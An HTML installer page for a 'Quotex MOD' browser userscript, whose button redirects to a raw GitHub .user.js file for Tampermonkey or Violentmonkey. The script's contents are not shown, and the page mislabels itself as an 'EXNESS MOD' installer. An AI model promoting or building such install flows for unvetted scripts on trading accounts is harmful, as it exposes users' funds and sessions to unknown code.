<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MODQUOTEX</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            height: 100vh;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            overflow: hidden;
        }

        .container {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(14px);
            border-radius: 20px;
            padding: 40px 32px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.45);
        }

        .icon-box {
            width: 80px;
            height: 80px;
            margin: 0 auto 28px;
            border-radius: 20px;
            background: rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }

        h1 {
            font-size: 42px;
            font-weight: 400;
            margin: 0 0 10px;
            color: #00b6ff;
            letter-spacing: 1px;
            text-shadow: 0 4px 16px rgba(0,0,0,0.4);
        }

        h2 {
            font-size: 15px;
            font-weight: 600;
            margin: 0 0 30px;
            color: #ffffff;
            opacity: 0.9;
        }

        p {
            font-size: 14px;
            line-height: 1.6;
            color: rgba(255,255,255,0.7);
            margin-bottom: 28px;
        }

        button {
            width: 100%;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: #ffffff;
            box-shadow: 0 8px 24px rgba(76, 175, 80, 0.35);
        }

        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 12px 32px rgba(76, 175, 80, 0.45);
        }

        .note {
            margin-top: 18px;
            font-size: 12px;
            color: rgba(255,255,255,0.55);
        }

        footer {
            position: absolute;
            bottom: 24px;
            font-size: 13px;
            color: rgba(255,255,255,0.6);
        }

        footer span {
            color: #00d4aa;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon-box">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1Z"/>
        </svg>
    </div>

    <h1>MOD Quotex</h1>
    <h2>Quotex MOD Installer</h2>

    <p>
       TO INSTALL EXNESS MOD<br>
        Violentmonkey or Tampermonkey must be installed first.
    </p>

    <button id="installBtn">Add Quotex MOD</button>

    <div class="note">
        Browser will ask for confirmation before installation.
    </div>
</div>

<footer>
    Created by <span>@modquotex</span>
</footer>

<script>
    document.getElementById("installBtn").addEventListener("click", function () {
        window.location.href =
            "https://github.com/modquotex/scq/raw/refs/heads/main/mq280126.user.js";
    });
</script>

</body>
</html>
